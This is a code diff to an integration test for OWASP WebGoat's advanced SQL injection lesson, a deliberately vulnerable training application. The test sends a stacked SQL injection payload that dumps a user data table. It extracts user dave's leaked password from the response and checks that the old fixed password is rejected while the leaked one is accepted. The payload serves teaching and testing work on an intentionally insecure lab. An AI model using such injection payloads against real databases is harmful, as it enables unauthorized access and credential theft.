@@ -4,8 +4,14 @@
  */
 package org.owasp.webgoat.integration;
 
+import static io.restassured.RestAssured.given;
+import static org.junit.jupiter.api.Assertions.assertNotEquals;
+import static org.junit.jupiter.api.Assertions.assertTrue;
+
 import java.util.HashMap;
 import java.util.Map;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 import org.junit.jupiter.api.Test;
 
 public class SqlInjectionAdvancedIntegrationTest extends IntegrationTest {
@@ -28,7 +34,20 @@ public class SqlInjectionAdvancedIntegrationTest extends IntegrationTest {
 
     params.clear();
     params.put("userid_6a", "'; SELECT * FROM user_system_data;--");
-      checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6a"), params, true);
+    String feedback =
+        given()
+            .relaxedHTTPSValidation()
+            .cookie("JSESSIONID", getWebGoatCookie())
+            .formParams(params)
+            .post(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6a"))
+            .then()
+            .statusCode(200)
+            .extract()
+            .path("feedback");
+    Matcher disclosed = Pattern.compile("dave, ([A-Za-z0-9]{10}),").matcher(feedback);
+    assertTrue(disclosed.find());
+    String currentPassword = disclosed.group(1);
+    assertNotEquals("passW0rD", currentPassword);
 
     params.clear();
     params.put(
@@ -39,6 +58,8 @@ public class SqlInjectionAdvancedIntegrationTest extends IntegrationTest {
 
     params.clear();
     params.put("userid_6b", "passW0rD");
+      checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6b"), params, false);
+    params.put("userid_6b", currentPassword);
       checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6b"), params, true);
 
     params.clear();
